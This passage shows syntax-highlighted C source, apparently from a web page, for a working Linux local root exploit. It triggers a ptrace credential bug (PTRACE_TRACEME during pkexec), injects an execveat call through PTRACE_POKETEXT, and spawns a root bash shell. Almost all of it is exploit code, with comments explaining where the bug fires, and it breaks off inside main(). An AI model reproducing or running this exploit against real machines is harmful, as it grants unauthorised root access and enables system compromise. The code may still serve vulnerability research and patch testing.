</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;err.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sched.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stddef.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdarg.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;pwd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ptrace.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/user.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/syscall.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/elf.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define SAFE(expr) ({                   \
</span></span></span><span class=line><span class=cl><span class=cp>  typeof(expr) __res = (expr);          \
</span></span></span><span class=line><span class=cl><span class=cp>  if (__res == -1) err(1, &#34;%s&#34;, #expr); \
</span></span></span><span class=line><span class=cl><span class=cp>  __res;                                \
</span></span></span><span class=line><span class=cl><span class=cp>})
</span></span></span><span class=line><span class=cl><span class=cp>#define max(a,b) ((a)&gt;(b) ? (a) : (b))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>middle_success</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>block_pipe</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>self_fd</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>dummy_status</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>helper_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>helpers</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* temporary printf; returned pointer is valid until next tprintf */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>char</span> <span class=o>*</span><span class=nf>tprintf</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>fmt</span><span class=p>,</span> <span class=p>...)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>static</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>10000</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>va_list</span> <span class=n>ap</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>va_start</span><span class=p>(</span><span class=n>ap</span><span class=p>,</span> <span class=n>fmt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>vsprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>fmt</span><span class=p>,</span> <span class=n>ap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>va_end</span><span class=p>(</span><span class=n>ap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>middle_main</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>dummy</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>prctl</span><span class=p>(</span><span class=n>PR_SET_PDEATHSIG</span><span class=p>,</span> <span class=n>SIGKILL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>pid_t</span> <span class=n>middle</span> <span class=o>=</span> <span class=n>getpid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>self_fd</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=s>&#34;/proc/self/exe&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>pid_t</span> <span class=n>child</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>fork</span><span class=p>());</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>child</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>prctl</span><span class=p>(</span><span class=n>PR_SET_PDEATHSIG</span><span class=p>,</span> <span class=n>SIGKILL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>SAFE</span><span class=p>(</span><span class=n>dup2</span><span class=p>(</span><span class=n>self_fd</span><span class=p>,</span> <span class=mi>42</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* spin until our parent becomes privileged (have to be fast here) */</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>proc_fd</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=n>tprintf</span><span class=p>(</span><span class=s>&#34;/proc/%d/status&#34;</span><span class=p>,</span> <span class=n>middle</span><span class=p>),</span> <span class=n>O_RDONLY</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>needle</span> <span class=o>=</span> <span class=n>tprintf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Uid:</span><span class=se>\t</span><span class=s>%d</span><span class=se>\t</span><span class=s>0</span><span class=se>\t</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getuid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>1000</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>ssize_t</span> <span class=n>buflen</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>pread</span><span class=p>(</span><span class=n>proc_fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>      <span class=n>buf</span><span class=p>[</span><span class=n>buflen</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>strstr</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>needle</span><span class=p>))</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * this is where the bug is triggered.
</span></span></span><span class=line><span class=cl><span class=cm>     * while our parent is in the middle of pkexec, we force it to become our
</span></span></span><span class=line><span class=cl><span class=cm>     * tracer, with pkexec&#39;s creds as ptracer_cred.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_TRACEME</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * now we execute passwd. because the ptrace relationship is considered to
</span></span></span><span class=line><span class=cl><span class=cm>     * be privileged, this is a proper suid execution despite the attached
</span></span></span><span class=line><span class=cl><span class=cm>     * tracer, not a degraded one.
</span></span></span><span class=line><span class=cl><span class=cm>     * at the end of execve(), this process receives a SIGTRAP from ptrace.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;executing passwd&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>execl</span><span class=p>(</span><span class=s>&#34;/usr/bin/passwd&#34;</span><span class=p>,</span> <span class=s>&#34;passwd&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>err</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;execl passwd&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>dup2</span><span class=p>(</span><span class=n>self_fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>dup2</span><span class=p>(</span><span class=n>block_pipe</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>passwd</span> <span class=o>*</span><span class=n>pw</span> <span class=o>=</span> <span class=n>getpwuid</span><span class=p>(</span><span class=n>getuid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>pw</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=n>err</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;getpwuid&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>middle_success</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>execl</span><span class=p>(</span><span class=s>&#34;/usr/bin/pkexec&#34;</span><span class=p>,</span> <span class=s>&#34;pkexec&#34;</span><span class=p>,</span> <span class=s>&#34;--user&#34;</span><span class=p>,</span> <span class=n>pw</span><span class=o>-&gt;</span><span class=n>pw_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>helper_path</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;--help&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>middle_success</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>err</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;execl pkexec&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>force_exec_and_wait</span><span class=p>(</span><span class=n>pid_t</span> <span class=n>pid</span><span class=p>,</span> <span class=kt>int</span> <span class=n>exec_fd</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>user_regs_struct</span> <span class=n>regs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iov</span> <span class=o>=</span> <span class=p>{</span> <span class=p>.</span><span class=n>iov_base</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>regs</span><span class=p>,</span> <span class=p>.</span><span class=n>iov_len</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>regs</span><span class=p>)</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_SYSCALL</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dummy_status</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_GETREGSET</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=n>NT_PRSTATUS</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>iov</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* set up indirect arguments */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>scratch_area</span> <span class=o>=</span> <span class=p>(</span><span class=n>regs</span><span class=p>.</span><span class=n>rsp</span> <span class=o>-</span> <span class=mh>0x1000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0xfffUL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>injected_page</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>envv</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>arg0</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>path</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=n>ipage</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>argv</span> <span class=o>=</span> <span class=p>{</span> <span class=n>scratch_area</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>injected_page</span><span class=p>,</span> <span class=n>arg0</span><span class=p>)</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>strcpy</span><span class=p>(</span><span class=n>ipage</span><span class=p>.</span><span class=n>arg0</span><span class=p>,</span> <span class=n>arg0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ipage</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pdata</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ipage</span><span class=p>)[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_POKETEXT</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=n>scratch_area</span> <span class=o>+</span> <span class=n>i</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>pdata</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* execveat(exec_fd, path, argv, envv, flags) */</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>orig_rax</span> <span class=o>=</span> <span class=n>__NR_execveat</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>exec_fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=n>scratch_area</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>injected_page</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=n>scratch_area</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>injected_page</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>r10</span> <span class=o>=</span> <span class=n>scratch_area</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>injected_page</span><span class=p>,</span> <span class=n>envv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>regs</span><span class=p>.</span><span class=n>r8</span> <span class=o>=</span> <span class=n>AT_EMPTY_PATH</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_SETREGSET</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=n>NT_PRSTATUS</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>iov</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_DETACH</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dummy_status</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>middle_stage2</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* our child is hanging in signal delivery from execve()&#39;s SIGTRAP */</span>
</span></span><span class=line><span class=cl>  <span class=n>pid_t</span> <span class=n>child</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dummy_status</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>force_exec_and_wait</span><span class=p>(</span><span class=n>child</span><span class=p>,</span> <span class=mi>42</span><span class=p>,</span> <span class=s>&#34;stage3&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>spawn_shell</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>setresgid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>setresuid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>execlp</span><span class=p>(</span><span class=s>&#34;bash&#34;</span><span class=p>,</span> <span class=s>&#34;bash&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>err</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;execlp&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s>&#34;stage2&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>middle_stage2</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s>&#34;stage3&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>spawn_shell</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=k>sizeof</span><span class=p>(</span><span class=n>helpers</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=n>helpers</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>stat</span> <span class=n>st</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>stat</span><span class=p>(</span><span class=n>helpers</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>st</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>helper_path</span> <span class=o>=</span> <span class=n>helpers</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>helper_path</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>errx</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;no known helper found, add a helper with &lt;allow_active&gt;yes&lt;/allow_active&gt; from /usr/share/polkit-1/actions to `helpers`&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   * set up a pipe such that the next write to it will block: packet mode,
</span></span></span><span class=line><span class=cl><span class=cm>   * limited to one packet
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>pipe2</span><span class=p>(</span><span class=n>block_pipe</span><span class=p>,</span> <span class=n>O_CLOEXEC</span><span class=o>|</span><span class=n>O_DIRECT</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>block_pipe</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>F_SETPIPE_SZ</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>dummy</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
